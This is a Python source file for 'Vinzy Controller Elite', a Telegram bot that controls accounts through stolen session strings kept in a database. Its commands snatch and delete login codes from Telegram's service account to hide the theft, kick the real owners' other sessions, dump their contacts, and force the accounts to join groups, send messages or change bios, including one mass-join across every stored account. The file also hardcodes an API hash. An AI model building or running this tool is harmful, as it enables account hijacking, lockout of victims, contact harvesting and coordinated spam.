import os
import asyncio
import telebot
import psycopg2
from telethon import TelegramClient, functions, types, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
# These must be set in your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

# Standardize GROUP_ID to handle the -100 prefix
try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# --- DATABASE LOGIC (NEON.COM) ---

def init_db():
    """Initializes the database table if it doesn't exist."""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS controlled_accounts (
            phone TEXT PRIMARY KEY,
            session_string TEXT NOT NULL,
            owner_name TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def save_account(phone, session, name):
    """Saves or updates a session string in the database."""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO controlled_accounts (phone, session_string, owner_name) 
        VALUES (%s, %s, %s) 
        ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
    ''', (phone, session, name))
    conn.commit()
    cur.close()
    conn.close()

def get_session(phone):
    """Retrieves a session string for a specific phone number."""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return res[0] if res else None

def get_all_phones():
    """Returns all accounts stored in the database."""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT phone, owner_name FROM controlled_accounts")
    res = cur.fetchall()
    cur.close()
    conn.close()
    return res

# Initialize DB on startup
init_db()

# --- CORE TELETHON RUNNER ---

async def run_task(phone, task_func, *args):
    """Connects to a session and runs a task, then disconnects."""
    session_str = get_session(phone)
    if not session_str:
        return "❌ Phone number not found in the Database."
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return f"❌ Session for {phone} has expired or was revoked."
        return await task_func(client, *args)
    except Exception as e:
        return f"⚠️ Technical Error: {str(e)}"
    finally:
        await client.disconnect()

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    """Displays the help menu for authorized group members."""
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>Vinzy Controller Elite</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "🔌 <b>Auth & DB:</b>\n"
        "• <code>.auth [string]</code> - Register session to NeonDB\n"
        "• <code>.list</code> - View all saved accounts\n\n"
        "🕵️ <b>Stealth Features:</b>\n"
        "• <code>.getcode [phone]</code> - Snatch & Delete Login Code\n"
        "• <code>.kickall [phone]</code> - Terminate all other sessions\n"
        "• <code>.contacts [phone]</code> - Dump 20 recent contacts\n\n"
        "🎮 <b>Remote Actions:</b>\n"
        "• <code>.join [phone] [link]</code> - Force join a group\n"
        "• <code>.massjoin [link]</code> - All bots join one group\n"
        "• <code>.msg [phone] [user] [text]</code> - Send DM\n"
        "• <code>.bio [phone] [text]</code> - Change account bio\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    """Verifies a fresh session string and saves it to the DB."""
    if m.chat.id != GROUP_ID: return
    
    # Split using None to handle any whitespace and long strings correctly
    parts = m.text.split(None, 1)
    if len(parts) < 2:
        return bot.reply_to(m, "❌ Usage: <code>.auth [session_string]</code>")
    
    session_str = parts[1].strip()
    status_msg = bot.reply_to(m, "⏳ <i>Verifying session with Telegram...</i>", parse_mode="HTML")

    async def verify_and_save(client):
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "❌ <b>Session Failed:</b> This string is invalid or expired."
            
            me = await client.get_me()
            save_account(me.phone, session_str, me.first_name)
            return f"✅ <b>Authorized:</b> {me.first_name}\n📱 Phone: <code>{me.phone}</code>\n🆔 ID: <code>{me.id}</code>"
        except Exception as e:
            return f"⚠️ <b>Auth Error:</b> {str(e)}"
        finally:
            await client.disconnect()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    res = loop.run_until_complete(verify_and_save(client))
    
    bot.edit_message_text(res, m.chat.id, status_msg.message_id, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    """Lists all accounts currently in the Neon Database."""
    if m.chat.id != GROUP_ID: return
    accounts = get_all_phones()
    if not accounts: return bot.reply_to(m, "📭 <b>Database is empty.</b>")
    
    msg = "📋 <b>Managed Accounts:</b>\n"
    for phone, name in accounts:
        msg += f"• {name} (<code>{phone}</code>)\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def cmd_getcode(m):
    """Retrieves the login code from the official Telegram account and deletes it."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.getcode [phone]</code>")
    
    phone = parts[1]
    
    async def logic(client):
        # 777000 is Telegram's official ID for login codes
        async for msg in client.iter_messages(777000, limit=1):
            code_text = msg.text
            await client.delete_messages(777000, [msg.id])
            return f"📩 <b>Code Snatched for {phone}:</b>\n\n<code>{code_text}</code>\n\n<i>Message was deleted for stealth.</i>"
        return "📭 No recent code found from Telegram."

    bot.send_message(m.chat.id, f"🔍 <i>Checking inbox for {phone}...</i>", parse_mode="HTML")
    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def cmd_kickall(m):
    """Terminates all other active sessions on the account."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.kickall [phone]</code>")
    
    phone = parts[1]
    
    async def logic(client):
        await client(functions.auth.ResetAuthorizationsRequest())
        return f"⚡ <b>Sessions Reset:</b> All other devices have been kicked for <code>{phone}</code>."

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.contacts'))
def cmd_contacts(m):
    """Dumps a brief list of contacts from the controlled account."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.contacts [phone]</code>")
    
    phone = parts[1]
    
    async def logic(client):
        res = await client(functions.contacts.GetContactsRequest(hash=0))
        msg = f"👥 <b>Recent Contacts ({phone}):</b>\n"
        for u in res.users[:20]:
            msg += f"• {u.first_name} (<code>{getattr(u, 'phone', 'Private')}</code>)\n"
        return msg

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.massjoin'))
def cmd_massjoin(m):
    """Forces every account in the database to join a specific link."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.massjoin [link]</code>")
    
    link = parts[1]
    phones = get_all_phones()
    
    bot.send_message(m.chat.id, f"🚀 <b>Mass-Join Started:</b> Adding {len(phones)} accounts to {link}...")
    
    async def logic(client, target):
        try:
            await client(functions.channels.JoinChannelRequest(channel=target))
            return True
        except:
            return False

    success_count = 0
    for phone, name in phones:
        if asyncio.run(run_task(phone, logic, link)):
            success_count += 1
    
    bot.send_message(m.chat.id, f"✅ <b>Done!</b> {success_count}/{len(phones)} accounts joined successfully.")

@bot.message_handler(func=lambda m: m.text.startswith('.msg'))
def cmd_msg(m):
    """Sends a private message from a controlled phone."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 3)
    if len(parts) < 4: return bot.reply_to(m, "❌ Usage: <code>.msg [phone] [user] [text]</code>")
    
    phone, target, text = parts[1], parts[2], parts[3]
    
    async def logic(client, t, txt):
        await client.send_message(t, txt)
        return f"✅ <b>Message Sent</b> from <code>{phone}</code> to {t}."

    res = asyncio.run(run_task(phone, logic, target, text))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def cmd_bio(m):
    """Changes the bio (About) section of the account."""
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3: return bot.reply_to(m, "❌ Usage: <code>.bio [phone] [text]</code>")
    
    phone, new_bio = parts[1], parts[2]
    
    async def logic(client, text):
        await client(functions.account.UpdateProfileRequest(about=text))
        return f"✅ <b>Bio Updated</b> for <code>{phone}</code>."

    res = asyncio.run(run_task(phone, logic, new_bio))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- MAIN RUNNER ---

if __name__ == "__main__":
    print("--- Vinzy Controller Elite Online ---")
    print(f"Listening in Group: {GROUP_ID}")
    bot.infinity_polling()
